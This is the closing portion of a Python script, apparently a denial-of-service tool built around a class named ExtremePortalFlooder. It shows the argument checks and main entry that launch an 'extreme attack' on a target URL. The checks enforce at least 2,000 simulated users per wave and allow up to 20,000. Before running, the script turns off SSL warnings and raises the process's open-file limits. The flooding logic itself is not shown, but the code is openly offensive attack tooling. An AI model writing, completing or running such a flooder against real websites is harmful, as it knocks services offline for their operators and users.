    parser.add_argument("--timeout", type=int, default=2,
                       help="Request timeout in seconds (default: 2)")
    
    args = parser.parse_args()
    
    # Validate extreme parameters
    if args.min < 2000:
        print(f"{Colors.RED}Error: For extreme attacks, minimum users must be at least 2000{Colors.END}")
        sys.exit(1)
    
    if args.min > args.max:
        print(f"{Colors.RED}Error: Minimum users cannot be greater than maximum users{Colors.END}")
        sys.exit(1)
    
    if args.max > 20000:
        print(f"{Colors.RED}Warning: Maximum users above 20000 may cause system instability{Colors.END}")
        # Continue anyway with warning
    
    if args.countdown < 0:
        print(f"{Colors.RED}Error: Countdown cannot be negative{Colors.END}")
        sys.exit(1)
    
    if args.duration <= 0:
        print(f"{Colors.RED}Error: Duration must be positive{Colors.END}")
        sys.exit(1)
    
    # Create and configure extreme flooder
    flooder = ExtremePortalFlooder(args.url)
    flooder.countdown_seconds = args.countdown
    flooder.total_duration = args.duration
    flooder.wave_interval = args.interval
    flooder.min_users_per_wave = args.min
    flooder.max_users_per_wave = args.max
    flooder.max_concurrent_threads = args.threads
    flooder.batch_size = args.batch
    flooder.request_timeout = args.timeout
    
    # Run extreme attack
    flooder.run_extreme_attack()


if __name__ == "__main__":
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Increase system limits
    sys.setrecursionlimit(1000000)
    
    # Check for resource availability
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (10000, 10000))
    except:
        pass  # Continue anyway
    
    main()